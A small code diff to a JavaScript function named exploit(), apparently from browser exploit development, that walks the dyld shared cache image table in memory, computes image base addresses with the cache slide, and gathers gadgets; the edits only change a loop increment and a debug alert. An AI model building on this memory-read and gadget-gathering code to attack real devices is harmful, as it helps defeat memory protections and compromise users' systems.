@@ -688,7 +688,7 @@ function exploit(){
         var gadgets = {};
         var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
         var nimgs = memory.u32(Add(hdr, 0x1c));
-        for(var i = 0; i < nimgs; ++i)
+        for(var i = 0; i < nimgs; i++)
         {
         
             var m = i * 0x20;
@@ -703,7 +703,7 @@ function exploit(){
 
 
             };
-            alert("dyld image #"+nimgs+":"+ab2str(fn()))
+            alert("dyld image #"+i+":"+ab2str(fn()))
             var base = Add(memory.read_i64(Add(imgs,m),0), cache_slide);
             alert("base" + base);
             //alert(opcode_libs.some())
